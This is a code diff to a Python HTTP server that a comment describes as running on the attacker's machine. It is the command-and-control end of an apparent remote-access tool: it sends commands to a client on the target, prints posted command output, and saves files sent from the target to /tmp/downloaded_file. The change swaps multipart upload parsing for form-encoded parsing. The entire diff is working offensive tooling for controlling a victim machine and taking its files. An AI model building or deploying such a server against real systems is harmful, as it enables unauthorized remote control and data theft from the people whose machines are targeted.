@@ -1,6 +1,7 @@
 #Server ----> runs on the attacker's machine
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
 import os,cgi
 
 HTTP_STATUS_OK = 200
@@ -15,16 +16,10 @@ class MyHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
-    def save_file(self):
-        print(self.headers['content-type'])
-        content_type, _ = cgi.parse_header(self.headers['content-type'])
-        if content_type != 'multipart/form-data':
-            raise "[-] Unexpected POST request, needs to be multipart/form-data"
-
-        fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
-        fs_up=fs['file']                #Here file is the key to hold the actual file
+    def save_file(self, length):
+        data = parse_qs(self.rfile.read(length).decode())
         with open('/tmp/downloaded_file','wb') as output_file:
-            output_file.write(fs_up.file.read())
+            output_file.write(data["rfile"][0].encode())
         print("File saved as /tmp/downloaded_file")
 
     # Send command to client (on Target)
@@ -36,21 +31,21 @@ class MyHandler(BaseHTTPRequestHandler):
         self.wfile.write(command.encode())
 
     def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        self.send_response(200)
+        self.end_headers()
+
         if self.path == '/store':
             try:
-                self.save_file()
+                self.save_file(length)
             except Exception as e:
                 print(e)
             finally:
-                self.send_response(200)
-                self.end_headers()
                 return
 
-        self.send_response(200)
-        self.end_headers()
-        length  = int(self.headers['Content-Length'])
-        postVar = self.rfile.read(length) # Read then print the posted data
-        print(postVar.decode())
+        data = parse_qs(self.rfile.read(length).decode())
+        if "rfile" in data:
+            print(data["rfile"][0])
 
 
 if __name__ == '__main__':
